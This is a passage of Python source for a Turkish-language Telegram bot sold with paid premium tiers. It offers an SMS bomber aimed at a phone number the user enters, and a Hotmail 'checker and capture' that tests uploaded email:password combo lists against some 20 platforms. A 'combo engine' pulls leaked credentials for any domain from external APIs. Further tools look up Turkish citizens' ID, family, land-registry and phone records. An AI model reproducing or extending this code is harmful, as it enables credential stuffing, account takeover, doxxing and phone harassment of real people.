                            bot_instance.answer_callback_query(call.id, "⚠️ Aktif bombardıman var! /smsstop ile durdur.", show_alert=True)
                        except:
                            pass
                        return
                m = bot_instance.send_message(
                    call.message.chat.id,
                    "💣 <b>SMS Bomber</b>\n\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: <code>5306524123</code>"
                )
                bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data == "tool_hotmail":
                user_name = get_user_name(uid)
                keywords = get_user_keywords(uid)
                limit_text = get_keyword_limit_text(uid)
                is_prem = is_premium(uid)
                capture_left = get_capture_limit_text(uid)

                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                try:
                    bot_instance.edit_message_text(
                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 Kullanıcı: {user_name}\n"
                        f"🔖 Keyword: {', '.join(keywords)}\n"
                        f"📊 Keyword Limit: {limit_text}\n"
                        f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
                        f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n\n"
                        f"📌 Aşağıdaki menüden işlem yapın:",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=hotmail_keyboard(uid)
                    )
                except:
                    bot_instance.send_message(
                        call.message.chat.id,
                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n\n"
                        f"📌 Aşağıdaki menüden işlem yapın:",
                        reply_markup=hotmail_keyboard(uid)
                    )
                return

            if data == "hotmail_start":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                is_prem = is_premium(uid)
                limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT

                m = bot_instance.send_message(
                    call.message.chat.id,
                    f"📧 **Hotmail Checker**\n\n"
                    f"📌 Limit: {limit} satır\n"
                    f"🔖 Keyword Limit: {get_keyword_limit_text(uid)}\n"
                    f"{'⭐ Premium' if is_prem else '🆓 Free'}\n\n"
                    f"Lütfen combo dosyasını (email:password) gönderin."
                )
                bot_instance.register_next_step_handler(m, lambda m: _process_hotmail_file(m, bot_instance))
                return

            if data == "hotmail_addkw":
                if not can_add_keyword(uid):
                    try:
                        bot_instance.answer_callback_query(
                            call.id,
                            f"❌ Keyword limiti dolu! Maksimum: {get_keyword_limit_text(uid)}",
                            show_alert=True
                        )
                    except:
                        pass
                    return

                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                m = bot_instance.send_message(
                    call.message.chat.id,
                    f"➕ **Keyword Ekle**\n\n"
                    f"Mevcut: {', '.join(get_user_keywords(uid))}\n"
                    f"Limit: {get_keyword_limit_text(uid)}\n\n"
                    f"Eklemek istediğin keyword'ü yaz:\n"
                    f"(Birden fazla için virgülle ayır: netflix,paypal,amazon)"
                )
                bot_instance.register_next_step_handler(m, lambda m: _process_add_keyword(m, bot_instance, uid))
                return

            if data == "hotmail_delkw":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                m = bot_instance.send_message(
                    call.message.chat.id,
                    f"🗑️ **Keyword Sil**\n\n"
                    f"Mevcut: {', '.join(get_user_keywords(uid))}\n\n"
                    f"Silmek istediğin keyword'ü yaz:\n"
                    f"(Birden fazla için virgülle ayır: netflix,paypal)"
                )
                bot_instance.register_next_step_handler(m, lambda m: _process_del_keyword(m, bot_instance, uid))
                return

            if data == "hotmail_resetkw":
                default_keywords = ["tiktok", "instagram", "netflix"]
                set_user_keywords(uid, default_keywords)
                try:
                    bot_instance.answer_callback_query(call.id, "✅ Keywordler varsayılana sıfırlandı!", show_alert=True)
                except:
                    pass
                return

            if data == "capture_menu":
                if not can_use_capture(uid):
                    try:
                        bot_instance.answer_callback_query(
                            call.id,
                            f"❌ Capture hakkınız doldu! ({FREE_CAPTURE_LIMIT}/{FREE_CAPTURE_LIMIT})\n⭐ Premium ile sınırsız kullanın!",
                            show_alert=True
                        )
                    except:
                        pass
                    return

                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                try:
                    bot_instance.edit_message_text(
                        f"📸 **CAPTURE TOOL**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 Kullanıcı: {get_user_name(uid)}\n"
                        f"📊 Platform: 20 Farklı\n"
                        f"{'⭐ Premium (Sınırsız)' if is_premium(uid) else f'🆓 Free ({get_capture_limit_text(uid)} kaldı)'}\n\n"
                        f"📌 Aşağıdan platform seçin:",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=capture_keyboard(uid)
                    )
                except:
                    bot_instance.send_message(
                        call.message.chat.id,
                        f"📸 **CAPTURE TOOL**\n\n"
                        f"📌 Aşağıdan platform seçin:",
                        reply_markup=capture_keyboard(uid)
                    )
                return

            if data == "goto_hotmail":
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                try:
                    bot_instance.edit_message_text(
                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📌 Aşağıdaki menüden işlem yapın:",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=hotmail_keyboard(uid)
                    )
                except:
                    pass
                return

            if data == "capture_all":
                if not is_premium(uid):
                    try:
                        bot_instance.answer_callback_query(
                            call.id,
                            "🔒 Bu özellik sadece Premium kullanıcılara açık!",
                            show_alert=True
                        )
                    except:
                        pass
                    return

                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass

                m = bot_instance.send_message(
                    call.message.chat.id,
                    f"📸 **Tüm Platformlar Seçildi**\n\n"
                    f"Lütfen combo dosyasını (email:password) gönderin."
                )
                bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, None))
                return

            if data.startswith("capture_"):
                try:
                    num = int(data.split("_")[1])
                    if num in CAPTURE_APPS:
                        target_app = CAPTURE_APPS[num]
                        platform_name = CAPTURE_NAMES[num]

                        try:
                            bot_instance.answer_callback_query(call.id)
                        except:
                            pass

                        m = bot_instance.send_message(
                            call.message.chat.id,
                            f"📸 **{platform_name} Seçildi**\n\n"
                            f"Lütfen combo dosyasını (email:password) gönderin."
                        )
                        bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, target_app))
                except:
                    pass
                return

            if data.startswith("tool_"):
                key = data[5:]
                if key == "video":
                    m = bot_instance.send_message(call.message.chat.id, s(uid, "video_ask"))
                    bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))
                elif key == "predunyam":
                    _run_predunyam(call.message.chat.id, uid, bot_instance)
                elif key == "php2py":
                    bot_instance.send_message(call.message.chat.id, s(uid, "php2py"))
                elif key in ("proxycheck", "urlscan"):
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt)
                    bot_instance.register_next_step_handler(m, lambda m: _process_special_tool(m, key, bot_instance))
                elif key in TOOLS_API:
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt)
                    bot_instance.register_next_step_handler(m, lambda m: _process_generic_tool(m, key, bot_instance))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data.startswith("tr_"):
                key = data[3:]
                prompt = TURKEY_PROMPTS.get(lang(uid), TURKEY_PROMPTS["tr"]).get(key, s(uid, "enter_val"))
                m = bot_instance.send_message(call.message.chat.id, s(uid, "tr_ask", prompt=prompt))
                bot_instance.register_next_step_handler(m, lambda m: _process_turkey(m, key, bot_instance))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data.startswith("ls_"):
                if not is_premium_osint(uid):
                    try:
                        bot_instance.answer_callback_query(call.id, "🌍 OSINT Premium gerekli!", show_alert=True)
                    except:
                        pass
                    return
                key = data[3:]
                info = LEAKSIGHTS_API.get(key, {})
                m = bot_instance.send_message(call.message.chat.id,
                                              s(uid, "ls_ask", icon=info.get("icon", "🔍"),
                                                tool=info.get(lang(uid), info.get("tr", key))))
                bot_instance.register_next_step_handler(m, lambda m: _process_ls(m, key, bot_instance))
                try:
                    bot_instance.answer_callback_query(call.id)
                except:
                    pass
                return

            if data.startswith("adm_"):
                if uid != ADMIN_ID:
                    try:
                        bot_instance.answer_callback_query(call.id, s(uid, "admin_only"), show_alert=True)
                    except:
                        pass
                    return
                _handle_admin_cb(call, data[4:], bot_instance)
                return

            if data.startswith("setapi_"):
                val = data[7:]
                if val == "default":
                    db_set(uid, "api_pref", 0)
                    try:
                        bot_instance.answer_callback_query(call.id, "✅ Varsayılan API")
                    except:
                        pass
                else:
                    idx = int(val)
                    db_set(uid, "api_pref", idx)
                    try:
                        bot_instance.answer_callback_query(call.id, f"✅ {API_LIST[idx]['name']}")
                    except:
                        pass
                _show_api_menu(call.message.chat.id, uid, bot_instance,
                               edit=(call.message.chat.id, call.message.message_id))
                return

        except Exception as e:
            print(f"[CALLBACK ERROR] {e}")
            try:
                bot_instance.answer_callback_query(call.id, "⚠️ Bir hata oluştu!", show_alert=True)
            except:
                pass

    @bot_instance.pre_checkout_query_handler(func=lambda q: True)
    def precheckout(q):
        bot_instance.answer_pre_checkout_query(q.id, ok=True)

    @bot_instance.message_handler(content_types=["successful_payment"])
    def payment_ok(msg):
        uid = msg.from_user.id
        username = msg.from_user.username or msg.from_user.first_name or str(uid)
        payload = msg.successful_payment.invoice_payload

        if payload == "premium":
            set_premium(uid, username)
            bot_instance.reply_to(msg, "🎉 **Hotmail Premium aktif!**\n\n📧 Sınırsız Hotmail Check + 📸 Sınırsız Capture + 🔖 Sınırsız Keyword erişimi kazandın.")
            bot_instance.send_message(
                ADMIN_ID,
                f"📧 <b>YENİ HOTMAIL PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {PREMIUM_PRICE} Stars"
            )
        elif payload == "osint":
            set_premium_osint(uid, username)
            bot_instance.reply_to(msg, "🌍 **OSINT Premium aktif!**\n\n🔍 LeakSights OSINT (30+ Sorgu) erişimi kazandın.")
            bot_instance.send_message(
                ADMIN_ID,
                f"🌍 <b>YENİ OSINT PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {OSINT_PRICE} Stars"
            )


# ══════════════════════════════════════════════════════════════
#  PROCESS FUNCTIONS
# ══════════════════════════════════════════════════════════════

def _resolve_target(text):
    text = text.strip()

    if text.startswith("@"):
        username = text[1:]
        row = find_user_by_username(username)
        if row:
            return (row[0], row[1])
        else:
            return (None, None)
    elif text.isdigit():
        user_id = int(text)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, username FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
        conn.close()
        if row:
            return (row[0], row[1] or str(row[0]))
        else:
            return (user_id, str(user_id))
    return (None, None)


def _admin_premium_select_user(msg, bot_instance):
    target = msg.text.strip()
    tid, tuname = _resolve_target(target)

    if not tid:
        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı! Lütfen @kullaniciadi veya ID girin.")
        return

    add_user(tid, tuname or "", "Premium Verildi")

    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(
        _btn("📧 Hotmail Premium Ver", f"adm_give_hotmail_{tid}_{tuname or tid}"),
        _btn("🌍 OSINT Premium Ver", f"adm_give_osint_{tid}_{tuname or tid}"),
        _btn("📸 Capture Premium Ver", f"adm_give_capture_{tid}_{tuname or tid}"),
    )
    bot_instance.send_message(
        msg.chat.id,
        f"👤 Kullanıcı: @{tuname or tid} (ID: {tid})\n\nHangi premiumu vermek istiyorsun?",
        reply_markup=mk
    )


def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
    cid = call.message.chat.id
    mid = call.message.message_id
    if is_premium(tid):
        try:
            bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten Hotmail Premium!", cid, mid)
            bot_instance.answer_callback_query(call.id)
        except:
            pass
        return
    if set_premium(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"📧 @{tuname or tid} Hotmail Premium verildi!", cid, mid)
            bot_instance.answer_callback_query(call.id, "✅ Hotmail Premium verildi!")
        except:
            pass


def _admin_give_premium_osint(call, tid, tuname, bot_instance):
    cid = call.message.chat.id
    mid = call.message.message_id
    if is_premium_osint(tid):
        try:
            bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten OSINT Premium!", cid, mid)
            bot_instance.answer_callback_query(call.id)
        except:
            pass
        return
    if set_premium_osint(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"🌍 @{tuname or tid} OSINT Premium verildi!", cid, mid)
            bot_instance.answer_callback_query(call.id, "✅ OSINT Premium verildi!")
        except:
            pass


def _admin_give_premium_capture(call, tid, tuname, bot_instance):
    cid = call.message.chat.id
    mid = call.message.message_id
    if is_premium(tid):
        try:
            bot_instance.edit_message_text(f"ℹ️ @{tuname or tid} zaten Premium!", cid, mid)
            bot_instance.answer_callback_query(call.id)
        except:
            pass
        return
    if set_premium(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"📸 @{tuname or tid} Capture Premium verildi!", cid, mid)
            bot_instance.answer_callback_query(call.id, "✅ Capture Premium verildi!")
        except:
            pass


def _process_add_keyword(msg, bot_instance, uid):
    text = msg.text.strip()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
        return

    new_keywords = [k.strip().lower() for k in text.split(',') if k.strip()]

    if not new_keywords:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
        return

    current_keywords = get_user_keywords(uid)
    added = []
    failed = []

    for kw in new_keywords:
        if kw in current_keywords:
            failed.append(f"'{kw}' zaten mevcut")
            continue

        if not can_add_keyword(uid):
            failed.append(f"Limit dolu! ({get_keyword_limit_text(uid)})")
            break

        current_keywords.append(kw)
        added.append(kw)

    if added:
        set_user_keywords(uid, current_keywords)
        bot_instance.reply_to(
            msg,
            f"✅ **Keywordler eklendi!**\n\n"
            f"➕ Eklenen: {', '.join(added)}\n"
            f"📊 Mevcut: {', '.join(current_keywords)}\n"
            f"📌 Limit: {get_keyword_limit_text(uid)}"
        )
    else:
        bot_instance.reply_to(
            msg,
            f"❌ **Keyword eklenemedi!**\n\n"
            f"{', '.join(failed)}\n"
            f"📊 Mevcut: {', '.join(current_keywords)}"
        )


def _process_del_keyword(msg, bot_instance, uid):
    text = msg.text.strip().lower()
    if not text:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
        return

    del_keywords = [k.strip() for k in text.split(',') if k.strip()]

    if not del_keywords:
        bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
        return

    current_keywords = get_user_keywords(uid)
    removed = []
    not_found = []

    for kw in del_keywords:
        if kw in current_keywords:
            current_keywords.remove(kw)
            removed.append(kw)
        else:
            not_found.append(kw)

    if removed:
        set_user_keywords(uid, current_keywords)

        result_msg = f"✅ **Keywordler silindi!**\n\n"
        result_msg += f"🗑️ Silinen: {', '.join(removed)}\n"
        if not_found:
            result_msg += f"❌ Bulunamadı: {', '.join(not_found)}\n"
        result_msg += f"\n📊 Mevcut: {', '.join(current_keywords)}\n"
        result_msg += f"📌 Limit: {get_keyword_limit_text(uid)}"

        bot_instance.reply_to(msg, result_msg)
    else:
        bot_instance.reply_to(
            msg,
            f"❌ **Hiçbir keyword silinemedi!**\n\n"
            f"❌ Bulunamadı: {', '.join(not_found)}\n"
            f"📊 Mevcut: {', '.join(current_keywords)}"
        )


def _process_capture_file(msg, bot_instance, target_app):
    uid = msg.from_user.id

    if not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!")
        return

    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]

        if not combo_list:
            bot_instance.reply_to(msg, "❌ Dosyada geçerli combo bulunamadı!")
            return

        if not can_use_capture(uid):
            bot_instance.reply_to(
                msg,
                f"❌ **Capture hakkınız doldu!**\n\n"
                f"📊 Kullanım: {get_capture_used(uid)} / {FREE_CAPTURE_LIMIT}\n"
                f"⭐ Premium ile sınırsız kullanabilirsiniz."
            )
            return

        platform_name = "Tüm Platformlar"
        if target_app:
            for num, app_mail in CAPTURE_APPS.items():
                if app_mail == target_app:
                    platform_name = CAPTURE_NAMES[num]
                    break

        increment_capture_used(uid)

        status_msg = bot_instance.reply_to(
            msg,
            f"📸 **Capture Taraması Başladı!**\n\n"
            f"📂 Toplam: {len(combo_list)} satır\n"
            f"🎯 Hedef: {platform_name}\n"
            f"⏳ Lütfen bekleyin..."
        )

        def run_capture():
            user_name = get_user_name(uid)
            is_prem = is_premium(uid)
            start_capture_scan(combo_list, uid, user_name, is_prem, target_app)

            with CAPTURE_LOCK:
                results = CAPTURE_RESULTS.get(uid, [])
                bad_count = CAPTURE_BAD
                processed = CAPTURE_PROCESSED

            if results:
                msg_text = (
                    f"✅ **Capture Taraması Tamamlandı!**\n\n"
                    f"📊 Toplam Hit: {len(results)}\n"
                    f"❌ Bad: {bad_count}\n"
                    f"📂 İşlenen: {processed}"
                )

                try:
                    bot_instance.edit_message_text(msg_text, uid, status_msg.message_id)

                    if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
                        with open(f"capture_hits_{uid}.txt", "rb") as f:
                            bot_instance.send_document(
                                uid, f,
                                caption=f"📸 {len(results)}x Capture Hit"
                            )
                        os.remove(f"capture_hits_{uid}.txt")
                except:
                    pass
            else:
                try:
                    bot_instance.edit_message_text(
                        f"❌ **Hit bulunamadı!**\n\n"
                        f"📂 İşlenen: {processed}\n"
                        f"❌ Bad: {bad_count}",
                        uid, status_msg.message_id
                    )
                except:
                    pass

        threading.Thread(target=run_capture, daemon=True).start()

    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")


# ══════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════════

def _show_stats(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"))
        return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT

    txt = (f"{s(uid, 'stats_title')}\n{'─' * 30}\n\n"
           f"🔍 Sorgu: <b>{checks}</b>\n📦 Combo: <b>{combos}</b>\n"
           f"📧 Hotmail Premium: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT Premium: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"📊 Günlük: {daily['checks']}/{limit}\n"
           f"📸 Capture: {capture_used}/{'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"\n👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt)


def _show_profile(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"))
        return
    checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
    user_name = get_user_name(uid)
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    kw_list = keywords.split(',') if keywords else []

    txt = (f"⚡️ **SİSTEME HOŞGELDİNİZ**\n"
           f"{user_name} — {uid}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           f"👤 **KULLANICI PROFİLİ**\n"
           f"┣ Durum: {'🔴 YASAKLI' if is_banned_user else '🟢 ÇEVRİMİÇİ (ONLINE)'}\n"
           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE USER'} — 📊 Günlük Limitli ({limit})\n\n"
           f"📊 **SİSTEM İSTATİSTİKLERİ**\n"
           f"┣ Günlük Kullanım: {daily['checks']} / {limit}\n"
           f"┣ Toplam Check:    {checks + combos}\n"
           f"┣ Toplam Hit:      {daily['hits']}\n"
           f"┣ Thread Sayısı:   {HOTMAIL_THREADS} (10-100)\n"
           f"┣ Keywordler:      {len(kw_list)} / {get_keyword_limit_text(uid)}\n"
           f"┗ Capture Kullanım: {capture_used} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"⭐ **PREMIUM DURUM**\n"
           f"📧 Hotmail: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
           f"🌍 OSINT: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
           f"📅 Tarih: {prem_date or '—'}\n\n"
           f"👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt)


def _show_leaderboard(chat_id, uid, bot_instance):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id,username,first_name,total_checks,total_combos,is_premium,is_premium_osint FROM users WHERE is_banned=0 ORDER BY total_combos DESC LIMIT 10")
    users = c.fetchall()
    conn.close()

    if not users:
        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n\n❌ Henüz veri yok.")
        return

    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    txt = f"{s(uid, 'lb_title')}\n{'─' * 30}\n\n"
    for i, (u_id, uname, fname, tchk, tcmb, is_prem, is_prem_osint) in enumerate(users):
        nm = (fname or uname or str(u_id))[:15]
        pk = "⭐" if (is_prem or is_prem_osint) else ""
        txt += f"{medals[i]} <b>{nm}</b> {pk}\n   📦 {tcmb}  🔍 {tchk}\n\n"
    txt += f"👨‍💻 @hackledin"
    bot_instance.send_message(chat_id, txt)


def _show_api_menu(chat_id, uid, bot_instance, edit=None):
    cur = api_pref(uid)
    cur_name = API_LIST[cur]["name"] if cur < len(API_LIST) else "Varsayılan"
    txt = s(uid, "api_title", cur=cur_name)
    mk = InlineKeyboardMarkup(row_width=1)
    for i, api in enumerate(API_LIST):
        ico = "✅" if i == cur else "◻️"
        mk.add(_btn(f"{ico} {api['name']}", f"setapi_{i}"))
    mk.add(_btn("🔄 Varsayılan", "setapi_default"))
    mk.add(_btn(s(uid, "home_btn"), "goto_home"))
    if edit:
        try:
            bot_instance.edit_message_text(txt, edit[0], edit[1], reply_markup=mk)
            return
        except:
            pass
    bot_instance.send_message(chat_id, txt, reply_markup=mk)


def _show_help(chat_id, uid, bot_instance):
    txt = get_help_content(uid)
    bot_instance.send_message(chat_id, txt)


def _process_combo(msg, bot_instance):
    uid = msg.from_user.id
    txt = msg.text.strip().split()
    if not txt:
        return
    domain = txt[0].replace("http://", "").replace("https://", "").split("/")[0]
    limit = int(txt[1]) if len(txt) > 1 and txt[1].isdigit() else None
    sm = bot_instance.reply_to(msg, s(uid, "searching", domain=domain))
    combos, err, apis = _combo_engine(domain, limit)
    if err or not combos:
        bot_instance.edit_message_text(s(uid, "no_result", domain=domain), msg.chat.id, sm.message_id)
        return
    update_stats(uid, len(combos))
    now = datetime.now()
    fname = f"{domain}_{now.strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"{'=' * 60}\n CYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
        f.write(f" Toplam: {len(combos)}\n Tarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n\n")
        f.write("\n".join(combos))
        f.write(f"\n\n{'=' * 60}\n @hackledin\n")
    with open(fname, "rb") as f:
        bot_instance.send_document(msg.chat.id, f,
                                   caption=s(uid, "combo_caption", domain=domain, count=len(combos), apis=apis))
    os.remove(fname)
    try:
        bot_instance.delete_message(msg.chat.id, sm.message_id)
    except:
        pass


def _combo_engine(domain, limit=None):
    for bad in YASAKLI:
        if bad in domain.lower():
            return None, f"Yasaklı domain: {bad}", None
    combos = []
    apis = []

    def _extract(line):
        line = str(line)
        m = re.search(r"://[^/]+/[^:]*:(.+?):(.+)$", line)
        if m:
            return m.group(1).strip(), m.group(2).strip()
        parts = line.split(":")
        if len(parts) >= 2:
            return parts[-2].strip(), parts[-1].strip()
        return None, None

    for api in API_LIST:
        try:
            r = requests.get(api["url"] + domain, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            lines = []
            if api["type"] == "wazely":
                lines = data.get("foundLines", [])
            elif api["type"] == "solidar":
                lines = data.get("sonuclar", [])
            elif api["type"] == "rootturkey":
                raw = data.get("data", "") if isinstance(data, dict) else r.text
                lines = raw.split("\n")
            for l in lines:
                u, p = _extract(l)
                if u and p:
                    combos.append(f"{u}:{p}")
            apis.append(api["name"])
        except:
            pass
    uniq = list(set(combos))
    if limit:
        uniq = uniq[:limit]
    return uniq, None, " + ".join(apis)


def _process_turkey(msg, tool, bot_instance):
    uid = msg.from_user.id
    param = msg.text.strip()
    l = lang(uid)
    if tool in ("tc", "tcpro", "aile", "ailepro", "sulale", "tcgsm", "eokul", "tapu"):
        if not (param.isdigit() and len(param) == 11):
            bot_instance.reply_to(msg, s(uid, "invalid_tc"))
            return
    elif tool == "gsmtc":
        clean = re.sub(r"\D", "", param).lstrip("0")
        if not (clean.isdigit() and len(clean) == 10):
            bot_instance.reply_to(msg, s(uid, "invalid_gsm"))
            return
        param = clean
    elif tool == "adsoyad":
        parts = param.split()
        if len(parts) < 2:
            bot_instance.reply_to(msg, s(uid, "invalid_adsoyad"))
            return
    elif tool == "adaparsel":
        if "," not in param:
            bot_instance.reply_to(msg, s(uid, "invalid_adaparsel"))
            return
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    api_cfg = TURKIYE_API[tool]
    url = api_cfg["url"]
    if tool == "adsoyad":
        pts = param.split()
        url = url.replace("{ad}", pts[0]).replace("{soyad}", " ".join(pts[1:]))
    elif tool == "gsmtc":
        url = url.replace("{gsm}", param)
    elif tool == "adaparsel":
        pts = param.split(",")
        url = url.replace("{il}", pts[0].strip().upper()).replace("{ilce}", pts[1].strip().upper())
    else:
        url = url.replace("{tc}", param)
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id)
        return
    result = _fmt_generic(f"{TURKIYE_API[tool]['icon']} {TURKIYE_API[tool][l]}", data, param, "Türkiye Sorgu")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"Turkey_{tool}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "tr_caption", tool=tool.upper(), param=param,
                       date=datetime.now().strftime("%d.%m.%Y %H:%M")))


def _process_ls(msg, key, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    if not val:
        return
    sm = bot_instance.reply_to(msg, s(uid, "processing"))
    info = LEAKSIGHTS_API[key]
    url = info["url"].replace("{value}", requests.utils.quote(val))
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id)
        return
    l = lang(uid)
    title = f"{info['icon']} LeakSights — {info.get(l, info.get('tr', key))}"
    result = _fmt_generic(title, data, val, "LeakSights ⭐")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"LS_{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "ls_caption", val=val, date=datetime.now().strftime("%d.%m.%Y %H:%M")))


def _api_get(url):
    try:
        h = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, headers=h, timeout=20, verify=False)
        if r.status_code == 200:
            try:
                return r.json(), None
            except:
                return None, f"JSON hatası:\n{r.text[:300]}"
        return None, f"❌ HTTP {r.status_code}"
    except requests.Timeout:
        return None, "⏰ Zaman aşımı!"
    except Exception as e:
        return None, f"❌ {e}"


def _fmt_generic(title, data, queried, header_extra=""):
    now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    lines = ["=" * 60, f" {title}", "=" * 60, f" Aranan  : {queried}", f" Tarih   : {now}", "=" * 60, ""]

    def _dump(obj, indent=0):
        prefix = "  " * indent
        if isinstance(obj, dict):
            for k, v in obj.items():
                if v is None or str(v).strip() == "":
                    continue
                if isinstance(v, (dict, list)):
                    lines.append(f"{prefix}• {k}:")
                    _dump(v, indent + 1)
                else:
                    lines.append(f"{prefix}• {k}: {v}")
        elif isinstance(obj, list):
            for i, item in enumerate(obj, 1):
                lines.append(f"{prefix}[{i}]")
                _dump(item, indent + 1)
                lines.append("")
        else:
            if str(obj).strip():
                lines.append(f"{prefix}{obj}")

    _dump(data)
    lines += ["", "=" * 60, f" {header_extra} — Cyber Searcher", " Developer: @hackledin", "=" * 60]
    return "\n".join(lines)


def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption):
    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write(content)
        with open(fname, "rb") as f:
            bot_instance.send_document(chat_id, f, caption=caption)
        os.remove(fname)
        try:
            bot_instance.delete_message(chat_id, status_mid)
        except:
            pass
    except Exception as e:
        try:
            bot_instance.edit_message_text(f"❌ {e}", chat_id, status_mid)
        except:
            pass


def _download_video(link):
    os.makedirs("downloads", exist_ok=True)
    out_template = os.path.join("downloads", "%(id)s.%(ext)s")
    opts = {
        "format": "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
        "outtmpl": out_template,
        "noplaylist": True,
